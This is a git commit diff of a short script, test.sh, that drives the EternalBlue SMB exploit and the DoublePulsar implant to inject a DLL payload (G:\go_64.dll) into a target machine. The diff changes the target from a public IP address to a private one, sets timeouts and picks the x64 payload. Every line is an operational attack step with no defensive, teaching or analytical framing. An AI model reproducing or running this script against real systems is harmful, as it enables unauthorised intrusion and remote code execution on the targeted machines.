0aa8514d16980d637e4b7c9555de6792e95c33cc
wrfly <mr.wrfly@gmail.com>
2017-04-18 23:17:59 +0800

    fix

--- test.sh
+++ test.sh
@@ -1,8 +1,13 @@
+setg TargetIP 10.170.22.251
+setg NetworkTimeout 10
+
 use EternalBlue
-setg TargetIP 223.5.5.5
 execute
 
 use Doublepulsar
+set NetworkTimeout 10
+# set DllPayload G:\go.dll
+# set Architecture x86
 set DllPayload G:\go_64.dll
 set Architecture x64
 execute
